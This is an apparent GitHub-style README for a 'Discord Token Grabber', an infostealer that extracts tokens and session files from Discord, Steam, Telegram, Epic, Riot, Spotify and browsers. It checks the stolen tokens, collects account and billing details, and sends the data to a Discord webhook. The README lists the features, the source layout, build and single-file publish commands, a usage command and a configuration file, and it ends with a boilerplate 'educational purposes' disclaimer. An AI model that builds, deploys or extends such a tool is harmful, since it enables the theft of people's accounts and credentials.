# Discord Token Grabber | Multi-Platform | Steam/Telegram/Epic | Webhook Exfil

![Build](https://img.shields.io/badge/build-passing-brightgreen)
![.NET](https://img.shields.io/badge/.NET-9.0-blue)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-green)
![Stars](https://img.shields.io/github/stars/example/token-grabber?style=social)

## Overview

Multi-platform token extraction framework supporting Discord, Steam, Telegram, Epic Games, Riot Games, and Spotify. Features token validation, account information retrieval, Nitro status checking, and webhook-based exfiltration.

## Features

- **Discord Token Extraction** — LevelDB parsing, Local State decryption
- **Steam Session Grabber** — SSFN files, loginusers.vdf parsing
- **Telegram Session** — tdata folder extraction, session file parsing
- **Epic Games** — Account credentials from local config
- **Riot Games** — Auth tokens from RiotClientPrivateSettings
- **Spotify** — Premium status and session tokens
- **Browser Tokens** — Discord tokens from browser LocalStorage
- **Token Validation** — Real-time token validity checking via Discord API
- **Account Info** — Username, email, phone, Nitro status, billing
- **Webhook Delivery** — Rich embeds with account details and badges

## Project Structure

```
src/TokenGrabber/
├── Program.cs
├── Core/
│   ├── GrabberEngine.cs
│   ├── TokenValidator.cs
│   └── SessionManager.cs
├── Grabbers/
│   ├── DiscordGrabber.cs
│   ├── SteamGrabber.cs
│   ├── TelegramGrabber.cs
│   ├── EpicGrabber.cs
│   ├── RiotGrabber.cs
│   ├── SpotifyGrabber.cs
│   └── BrowserTokenGrabber.cs
├── Discord/
│   ├── TokenDecryptor.cs
│   ├── AccountInfo.cs
│   └── NitroChecker.cs
├── Exfil/
│   ├── WebhookSender.cs
│   └── PayloadBuilder.cs
├── Models/
│   ├── GrabbedToken.cs
│   └── AccountData.cs
├── Utils/
│   └── LevelDbParser.cs
└── Config/
    └── GrabberConfig.cs
```

## Build Instructions

### Prerequisites

- .NET 9.0 SDK
- Windows 10/11

### Build

```bash
dotnet restore
dotnet build --configuration Release
```

### Publish

```bash
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true
```

## Usage

```bash
TokenGrabber.exe --targets discord,steam,telegram --webhook <url>
```

### Configuration

```json
{
  "WebhookUrl": "YOUR_DISCORD_WEBHOOK",
  "Targets": ["discord", "steam", "telegram", "epic", "riot", "spotify"],
  "ValidateTokens": true,
  "IncludeAccountInfo": true,
  "IncludeBilling": false
}
```

## Disclaimer

**This software is provided for educational and authorized security research purposes only.** It is intended for use in controlled environments to study token storage mechanisms and credential security. Unauthorized access to accounts you do not own is illegal. The authors assume no responsibility for misuse of this tool.
